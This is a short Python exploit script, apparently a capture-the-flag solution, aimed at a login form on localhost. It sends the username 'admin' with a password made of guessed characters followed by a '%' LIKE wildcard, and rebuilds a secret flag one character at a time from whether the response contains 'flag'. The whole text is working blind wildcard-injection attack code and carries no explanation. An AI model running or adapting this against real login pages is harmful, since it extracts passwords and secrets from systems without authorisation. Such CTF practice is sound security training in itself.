#!/usr/bin/env python3
from string import printable
from requests import post

URL = "http://localhost:8080/index.php"

charset = printable.replace("_", "").replace("%", "")

print("flag : ", end="", flush=True)
flag = ""
for _ in range(32):
    for char in charset:
        data = {
            "username": "admin",
            "password": flag + char.strip() + "%"
        }

        req = post(URL, data=data)
    
        if "flag" in req.text:
            print(char, end="", flush=True)
            flag += char
            break
